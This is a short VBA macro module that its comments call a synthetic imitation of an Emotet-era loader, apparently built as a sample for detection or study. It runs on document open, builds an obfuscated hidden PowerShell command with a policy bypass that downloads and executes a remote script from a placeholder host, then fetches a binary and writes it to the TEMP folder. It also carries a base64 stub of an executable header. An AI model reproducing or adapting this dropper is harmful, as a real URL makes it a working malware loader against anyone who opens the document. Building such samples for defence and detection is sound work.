Attribute VB_Name = "Module1"
' Synthetic VBA macro — mimics common Emotet-era loader patterns:
'   * AutoOpen + Document_Open triggers
'   * Shell call into PowerShell with hidden window
'   * String concatenation / Chr() obfuscation
'   * Base64-encoded payload variable
' Domains are RFC2606 placeholders; no real exploit.

Option Explicit

Private Const KICKOFF_URL = "http://staging.notreal.example/u/x.txt"

Public Sub AutoOpen()
    Run_Payload
End Sub

Public Sub Document_Open()
    Run_Payload
End Sub

Private Sub Run_Payload()
    Dim cmd As String
    Dim parts(0 To 4) As String
    parts(0) = Chr(112) & "o" & Chr(119) & "ershell"      ' powershell, Chr-obfuscated
    parts(1) = " -W" & "indowStyle Hidden"
    parts(2) = " -ExecutionPolicy " & "Byp" & "ass"
    parts(3) = " -NoProfile -Command "
    parts(4) = """IEX((New-Object Net.WebClient).DownloadString('" & KICKOFF_URL & "'))"""
    cmd = parts(0) & parts(1) & parts(2) & parts(3) & parts(4)

    ' Shell out via WScript.Shell to also drop a CmdLineEventConsumer entry later.
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run cmd, 0, False

    ' Stage 2: pull a binary blob via XMLHTTP and write to disk.
    Dim http As Object, stream As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", "http://staging.notreal.example/u/p.bin", False
    http.Send
    Set stream = CreateObject("Adodb.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile Environ("TEMP") & "\svc.dat", 2
End Sub

Private Function B64Stub() As String
    B64Stub = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" _
           & "AAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9T"
End Function
